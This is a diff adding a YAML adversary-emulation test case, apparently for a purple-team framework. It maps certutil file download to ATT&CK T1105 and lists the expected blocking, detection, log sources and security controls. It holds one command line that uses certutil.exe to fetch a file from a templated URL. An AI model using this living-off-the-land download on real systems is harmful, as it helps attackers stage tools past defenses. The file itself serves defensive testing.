@@ -1,0 +1,28 @@
+name: Download file over HTTP using Certutil
+description: Download a file from a public HTTP server using certutil
+metadata:
+  isv: 1
+  tactic: TA0011
+  tid: T1105
+  x_vectr_id: b19ce681-bab3-450d-b497-7e5cdfdd87c7
+platforms:
+- windows
+guidance:
+- cmd> certutil.exe  -urlcache -split -f {{ url }}
+block:
+- Connections to known malicious domains/IPs are blocked
+- Signatures for known bad tools are blocked by network security controls such as an ID/PS
+- Suspicious process execution/behavior blocked by endpoint security tool
+detect:
+- Connections to known malicious domains/IPs are detected
+- Signatures for known bad tools are detected by network security controls such as an ID/PS
+- Suspicious process execution/behavior detected by endpoint security tool or triggers alert in SIEM based on telemetry
+logs:
+- web
+- process_create
+- edr:telemetry
+controls:
+- Firewall
+- ID/PS
+- Endpoint Protection
+- SIEM
